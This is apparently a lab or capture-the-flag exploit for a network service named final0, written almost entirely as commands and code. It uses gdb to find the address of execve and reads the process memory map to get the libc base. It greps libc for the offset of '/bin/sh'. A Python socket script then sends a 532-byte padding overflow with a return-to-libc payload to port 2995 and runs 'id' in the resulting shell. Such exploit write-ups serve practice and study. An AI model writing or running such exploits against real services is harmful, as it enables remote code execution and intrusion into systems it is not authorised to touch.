gdb ./final0
(gdb) info functions # find address of execve function 0x08048c0c

# get address of libc 0xb7e97000 loaded to server process
cat /proc/$(pidof final0)/maps

# print a byte offset of string /bin/sh in libc binary 1176511
grep -ab /bin/sh /lib/libc.so.6

echo "
import struct
import socket

HOST = '127.0.0.1'
PORT = 2995

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

padding = 'a' * 532
execve = struct.pack('I', 0x08048c0c)
binsh = struct.pack('I', 0xb7e97000 + 1176511)

exploit = padding + execve + 'a' * 4 + binsh + '\x00' * 8
client.send(exploit + '\n')
client.send('id\n')
print(client.recv(1024))
" > script.py

python script.py
